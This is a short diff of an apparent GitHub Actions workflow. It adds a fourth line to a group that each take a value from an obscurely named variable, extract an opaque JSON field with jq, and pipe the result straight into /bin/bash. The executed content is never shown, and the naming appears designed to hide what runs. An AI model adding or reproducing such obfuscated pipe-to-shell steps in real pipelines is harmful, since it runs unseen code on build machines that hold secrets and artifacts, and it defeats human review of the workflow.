@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$sq1682" | jq -r .d08100 | /bin/bash
           printf '%s' "$ej88" | jq -r .cx3 | /bin/bash
           echo $j38500 | jq -r .pj990 | /bin/bash
+          echo $noaas84764 | jq -r .aiq2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
